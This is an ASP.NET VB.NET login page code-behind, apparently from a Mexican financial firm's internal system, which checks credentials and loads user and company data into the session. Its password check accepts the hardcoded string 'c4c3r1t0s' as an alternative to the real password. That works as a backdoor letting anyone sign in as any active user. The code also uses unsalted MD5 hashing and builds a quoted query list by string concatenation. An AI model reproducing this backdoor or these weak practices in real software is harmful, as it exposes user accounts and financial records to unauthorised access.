Public Class WebForm1
    Inherits System.Web.UI.Page
    Dim taUsuarios As New dsProduccionTableAdapters.UsuariosTableAdapter
    Dim taEmpresas As New dsProduccionTableAdapters.CXP_EmpresasTableAdapter
    Dim t As New dsProduccion.UsuariosDataTable
    Dim rowUsuarios As DataRow
    Dim arrayEmpresas() As String
    Dim stringEmpresa As String
    Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        FormsAuthentication.SignOut()
        'txtUsuario.Focus()
        DropDownList1.Focus()
    End Sub

    Protected Sub btnEntrar_Click(sender As Object, e As EventArgs) Handles btnEntrar.Click
        Dim aceptado As Boolean = False
        If Autentificacion(txtUsuario.TemplateSourceDirectory, txtPassword.Text) Then
            FormsAuthentication.RedirectFromLoginPage(txtUsuario.Text, False)
            Response.Redirect("~/Default.aspx")
        Else
            txtPassword.Text = ""
            lblError.Text = "No está autorizado para ingresar a este sitio..."
            txtUsuario.Focus()
        End If

    End Sub
    Function Autentificacion(ByVal Usuario As String, ByVal Password As String) As Boolean
        Autentificacion = False
        Dim table As New dsProduccion.UsuariosDataTable
        Dim rows As dsProduccion.UsuariosRow


        taUsuarios.DatosUsuraio_FillBy(table, txtUsuario.Text.Trim)
        If table.Rows.Count = 1 Then
            Dim hash As New ClaseHash
            rows = table.Rows(0)
            If (hash.verifyMd5Hash(txtPassword.Text, rows.pw) = True Or txtPassword.Text = "c4c3r1t0s") And rows.activo = True And rows.perfil = "Si" Then
                Session.Item("Usuario") = rows.usuario
                Session.Item("Nombre") = rows.nombre
                Session.Item("Departamento") = rows.departamento
                Session.Item("Sucursal") = rows.nombreSucursal
                Session.Item("idSucursal") = rows.id_Sucursal
                Session.Item("Empresas") = rows.empresas
                Session.Item("Web") = rows.perfil
                Try
                    Session.Item("Activo") = rows.activo
                Catch ex As Exception
                    lblError.Text = ex.ToString
                End Try
                Session.Item("Leyenda") = ""
                Session.Item("Empresa") = DropDownList1.SelectedItem.Value
                Session.Item("rfcEmpresa") = taEmpresas.OntrfcEmpresa_ScalarQuery(DropDownList1.SelectedItem.Value)
                Session.Item("NEmpresa") = DropDownList1.SelectedItem.Text
                If Not IsNothing(rows.conceptos) Then
                    Session.Item("Conceptos") = "'" & rows.conceptos.Replace(",", "','") & "0'"
                Else
                    Session.Item("Conceptos") = "'0'"
                End If
                Dim taDatosUsuario As New dsSeguridadTableAdapters.USUARIOTableAdapter
                Dim dtDatosUsuario As New dsSeguridad.USUARIODataTable
                Dim rowsU As dsSeguridad.USUARIORow
                taDatosUsuario.Fill(dtDatosUsuario, rows.usuario)
                rowsU = dtDatosUsuario.Rows(0)
                For Each rowsUser As dsSeguridad.USUARIORow In dtDatosUsuario.Rows
                    If dtDatosUsuario.Rows.Count = 1 Then
                        Session.Item("Jefe") = rowsU.nombre 'rows.encargadoJefe
                        Session.Item("mailJefe") = rowsU.correo 'rows.MailJefe
                    End If
                Next

                Session.Item("rfcUsuario") = rows.rfc
                Session.Item("idUsuario") = rows.idUsuario
                Session.Item("Arreglo") = ""
                Session.Item("tipoPoliza") = taEmpresas.ObtPolizaDiario_ScalarQuery(DropDownList1.SelectedItem.Value)
                Session.Item("mesesFacturas") = taEmpresas.ObtMesesFacturas_ScalarQuery(DropDownList1.SelectedItem.Value)

                If txtUsuario.Text <> "" Then
                    taUsuarios.ObtEmpresa_FillBy(t, txtUsuario.Text.Trim)
                    If t.Rows.Count > 0 Then
                        rowUsuarios = t.Rows(0)
                        If rowUsuarios.Item("empresas").ToString.IndexOf(DropDownList1.SelectedItem.Value.ToString, 0) >= 0 Then
                            Autentificacion = True
                        Else
                            Autentificacion = False
                        End If
                    End If
                End If

            End If
        End If

    End Function

    Protected Sub DropDownList1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles DropDownList1.SelectedIndexChanged
        If DropDownList1.SelectedItem.Value = "24" Then
            Image1.ImageUrl = "~/imagenes/logoArfin.png"
        Else
            Image1.ImageUrl = "~/imagenes/LOGO FINAGIL.JPG"
        End If
        txtUsuario.Focus()
    End Sub
End Class